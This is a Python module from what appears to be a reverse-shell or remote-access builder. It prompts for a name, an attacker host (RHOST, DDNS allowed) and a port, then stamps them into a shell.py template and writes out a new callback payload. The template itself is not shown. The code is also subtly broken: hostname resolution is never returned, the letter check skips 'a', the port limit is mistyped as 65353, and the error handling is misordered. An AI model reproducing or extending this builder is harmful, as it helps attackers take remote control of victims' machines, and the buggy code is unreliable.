
from termcolor import colored
import os
from termcolor import colored
from socket import gethostbyname, inet_aton
from .Configurations import DEF_SHELL_PATH

def generate_shell():
    name = input("NAME> ")
    if name == "end":
        return
    while name == "":
        name = input("NAME> ")

    host = input("RHOST> ")
    if host == "end":
        return
    while len(host) < 1:
        host = input("RHOST> ")
    host = check_host(host)

    port = input("PORT> ")
    if port == "end":
        return
    while len(port) <1:
        port = input("PORT> ")
    port = check_port(int(port))

    with open(os.path.dirname(__file__) + "/shell.py", "r+") as source:
        content = source.read()
    content = content.replace("XHOST", host)
    content = content.replace("XPORT", str(port))

    path = DEF_SHELL_PATH + f"{name}.py"
    with open(path, "w") as shell:
        shell.write(content)
    if os.path.isfile(path):
        print(colored(f"[+] {name} Shell was created @ {DEF_SHELL_PATH}\n", "green"))
    else:
        print(colored("[!] Unexpected Error", "red"))
        exit(0)

def check_host(host):
    ALPHA = "bcdefghijklmnopqrstuvwxyz"
    if host[0] in ALPHA or host[0] in ALPHA.lower():
        try:
            host = gethostbyname(host)
        except:
            print(colored("[-] Invlaid DDNS server name!", "red"))
            exit(0)
    else:
        try:
            if inet_aton(host):
                return host
        except:
            print(colored(f"[-] Invalid IP address!", "red"))
            exit(0)

def check_port(port):
    if port < 1 or port > 65353:
        print(colored("[-] Port number must be *between <1-65353>", "red"))
        exit(0)
    try:
        port = int(port)
        return port
    except ValueError:
        print(colored("[-] Port number must ne integer number", "red"))
        exit(0)


